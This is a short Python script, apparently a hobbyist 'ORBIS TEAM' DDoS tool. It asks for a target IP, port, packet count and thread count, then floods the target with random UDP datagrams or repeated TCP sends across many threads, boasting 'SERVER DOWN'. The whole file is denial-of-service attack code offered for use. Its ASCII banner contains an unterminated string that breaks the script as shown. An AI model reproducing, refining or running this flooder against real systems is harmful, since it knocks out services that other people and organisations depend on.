import random
import socket
import threading

print("\033[92m")
print("""
    Tools by: Tự ...

    /\_____/\     88""Yb    db    .dP"Y8 .dP"Y8 8888b.  8888b.   dP"Yb  .dP"Y8
   /  o   o  \    88__dP   dPYb   `Ybo." `Ybo."  8I  Yb  8I  Yb dP   Yb `Ybo."
  ( ==  ^  == )   88""" 
print("\033[97m")
ip= str(input(" ip :"))
port= int(input(" port :"))
choice = str(input(" Ddos Attack?? (y/n):"))
times= int(input(" Paket :"))
threads= int(input(" threads :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ORBIS TEAM DDOS ATTACK!!!")
		except:
			print("[!] SERVER DOWN!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" ORBIS TEAM DDOS ATTACK!!!")
		except:
			s.close()
			print("[*] SERVER DOWN")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
